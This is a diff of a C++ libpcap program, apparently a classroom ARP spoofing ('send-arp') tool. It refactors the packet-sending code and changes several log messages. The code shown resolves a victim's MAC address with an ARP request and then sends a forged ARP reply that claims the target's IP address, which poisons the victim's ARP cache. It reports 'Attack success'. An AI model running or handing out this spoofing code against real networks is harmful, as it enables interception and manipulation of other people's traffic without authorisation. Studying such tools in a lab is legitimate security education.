@@ -35,15 +35,6 @@ void get_my_ip(char* dev, Ip* my_ip) {
 	printf("My IP: %s\n", std::string(*my_ip).c_str());
 }
 
-void print_result(pcap_t* handle, EthArpPacket* packet){
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
-	else {
-		printf("Success\n");
-	}
-}
 
 int main(int argc, char* argv[]) {
 	if (argc % 2) {
@@ -87,7 +78,13 @@ int main(int argc, char* argv[]) {
 		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
 		packet.arp_.tip_ = htonl(sender_ip);
 
-		print_result(handle, &packet);
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
+		else {
+			printf("Send packet success\n");
+		}
 
 		while(true) {
 			struct pcap_pkthdr* header;
@@ -101,18 +98,12 @@ int main(int argc, char* argv[]) {
 
 			EthArpPacket* eth_arp_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(send_packet));
 
-
-			// printf("Sender IP: %s\n", std::string(Ip(ntohl(Ip(eth_arp_packet->arp_.sip_)))).c_str());
-			// printf("Sender IP: %s\n", std::string(Ip(htonl(Ip(eth_arp_packet->arp_.sip_)))).c_str());
-			//printf("Sender IP: %s\n", std::string(eth_arp_packet->arp_.sip_).c_str());
-			//printf("Target IP: %s\n\n", std::string(packet.arp_.tip_).c_str());
-
 			if(eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
 			if(eth_arp_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
 			if(eth_arp_packet->arp_.sip_!= packet.arp_.tip_) continue;
 
 			sender_mac = eth_arp_packet->arp_.smac_;
-			printf("Sender MAC: %s\n", std::string(sender_mac).c_str());
+			printf("Get sender MAC: %s\n", std::string(sender_mac).c_str());
 
 			break;
 		}
@@ -122,7 +113,13 @@ int main(int argc, char* argv[]) {
 		packet.arp_.sip_ = htonl(target_ip);
 		packet.arp_.tmac_ = sender_mac;
 
-		print_result(handle, &packet);
+		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
+		else {
+			printf("Attack success\n");
+		}
 		pcap_close(handle);
 	}
 }
